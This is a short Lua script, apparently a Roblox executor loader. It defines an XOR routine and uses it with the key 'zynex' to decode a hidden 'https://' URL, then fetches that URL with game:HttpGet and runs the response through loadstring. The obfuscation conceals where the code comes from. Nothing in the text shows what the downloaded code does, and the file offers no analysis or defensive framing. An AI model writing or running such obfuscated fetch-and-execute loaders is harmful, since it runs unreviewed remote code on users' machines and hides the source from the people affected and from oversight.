local function _x(s, k)
    local r, b = {}, (bit32 and bit32.bxor) or (bit and bit.bxor)
    for i = 1, #s do
        r[i] = string.char(b(string.byte(s, i), string.byte(k, 1 + ((i - 1) % #k))))
    end
    return table.concat(r)
end

loadstring(game:HttpGet(_x("\18\13\26\21\11\64\86\65\23\25\13\87\9\12\12\18\12\12\16\11\31\11\13\10\22\14\28\0\17\86\25\22\3\74\21\3\17\11\12\11\31\23\12\0\10\29\86\60\10\59\18\28\29\22\87\23\24\7\11\87\20\22\5\0\1\84\21\27\4\13", "zynex")))()
